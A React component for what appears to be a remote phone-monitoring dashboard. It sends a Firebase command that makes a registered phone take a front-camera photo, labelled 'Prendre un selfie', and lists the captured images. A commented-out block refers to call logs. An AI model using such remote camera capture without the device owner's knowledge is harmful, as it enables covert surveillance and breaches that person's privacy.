import {ref, update, onValue} from "firebase/database";
import { auth, db } from '../firebase';
import React, { useState, useEffect } from 'react';
import { onAuthStateChanged } from "firebase/auth";

export default function CameraPhotos(props) {
    const [shots, setShots] = useState([]);
    const [user, setUser] = useState({});
    const { phone } = props;

    useEffect(() => {
        if (phone) {
            onAuthStateChanged(auth, (user) => {
                setUser(user)
                const query = ref(db, `user/${user.uid}/${phone}/photo/data`);
                onValue(query, (snapshot) => {
                    if (snapshot.exists()) {
                        let shots = []
                        Object.values(snapshot.val()).map((shot) => {
                            console.log(shot)
                            shots.push(shot)
                        })
                        setShots(shots)
                    } else {
                        console.log("No data available");
                        alert('Aucune capture enregistrée')
                    }
                })
                /*const dbRef = ref(db);
                get(child(dbRef, `user/${user.uid}/${phone}/photo/data`)).then((snapshot) => {
                    if (snapshot.exists()) {
                        setCallLogs(snapshot.val());
                    } else {
                        console.log("No data available");
                    }
                }).catch((error) => {
                    console.error(error);
                });*/
            });
        }
    }, [phone])

    const sendTakeScreenshotCommand = () => {
        const query = ref(db, `user/${user.uid}/${phone}/photo/params`);
        const params = {
            capturePhoto: true,
            facingPhoto: 1
        };
        update(query, params).then(r => {
            console.log("Capture d'écan envoyée")
        });
    }

    return <div className="card p-3" style={{ height: 'auto'}}>
        <h1>Photo</h1>

        <button onClick={sendTakeScreenshotCommand}>Prendre un selfie</button>
        <br/>
        <table className="table">
            <thead>
            <tr>
                <td>Nom</td>
                <td>Date</td>
                <td>Photo</td>
            </tr>
            </thead>
            <tbody>
            {
                shots.map((shot, index) => (
                    <tr key={index}>
                        <td>{shot.nameRandom}</td>
                        <td>{new Date(shot.dateTime).toUTCString()}</td>
                        <td>
                            <img src={shot.urlPhoto} alt="screenshot" style={{ width: 50, height: 'auto'}}/>
                        </td>
                    </tr>
                ))
            }
            </tbody>
        </table>

    </div>
}